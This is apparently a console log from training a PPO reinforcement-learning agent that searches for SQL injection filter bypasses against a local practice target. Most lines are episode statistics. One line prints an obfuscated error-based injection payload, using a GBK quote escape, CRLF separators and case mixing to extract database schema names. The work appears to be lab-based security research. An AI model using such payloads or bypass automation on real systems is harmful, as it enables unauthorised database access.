/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run PPO on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — PPO Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Seed        : 2
============================================================
  Ep 2440 | SR=0% | Steps=15.0 | R=-38.59
  Ep 2450 | SR=0% | Steps=15.0 | R=-38.10
  Ep 2460 | SR=0% | Steps=15.0 | R=-37.66
  Ep 2470 | SR=0% | Steps=15.0 | R=-37.89
  Ep 2480 | SR=0% | Steps=15.0 | R=-38.08
  Ep 2490 | SR=0% | Steps=15.0 | R=-37.62
  Ep 2500 | SR=0% | Steps=15.0 | R=-37.83
  Ep 2510 | SR=0% | Steps=15.0 | R=-37.30
  Ep 2520 | SR=0% | Steps=15.0 | R=-38.29
  Ep 2530 | SR=0% | Steps=15.0 | R=-38.55
  Ep 2540 | SR=0% | Steps=15.0 | R=-38.04
  Ep 2550 | SR=0% | Steps=15.0 | R=-39.01
  Ep 2560 | SR=0% | Steps=15.0 | R=-38.31
  Ep 2570 | SR=0% | Steps=15.0 | R=-37.92
  Ep 2580 | SR=0% | Steps=15.0 | R=-38.73
  Ep 2590 | SR=0% | Steps=15.0 | R=-38.79
  [BYPASS] Ep 2599 | steps=10 | seq=gbk_bypass -> crlf -> null_byte -> case -> case -> case -> case -> case -> case -> agg_swap
           payload: 1%bf%27%0d%0aAND%0d%0aEXP(~(seleCT%0d%0a*%0d%0afroM%0d%0a(SELECt%0d%0a((selEcT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRoM%0d%0ainFoRMATiOn_schemA.schem
  Ep 2600 | SR=10% | Steps=14.5 | R=-34.83
  Ep 2610 | SR=0% | Steps=15.0 | R=-37.66
  Ep 2620 | SR=0% | Steps=15.0 | R=-38.44
  Ep 2630 | SR=0% | Steps=15.0 | R=-39.17
  Ep 2640 | SR=0% | Steps=15.0 | R=-38.26
  Ep 2650 | SR=0% | Steps=15.0 | R=-38.21
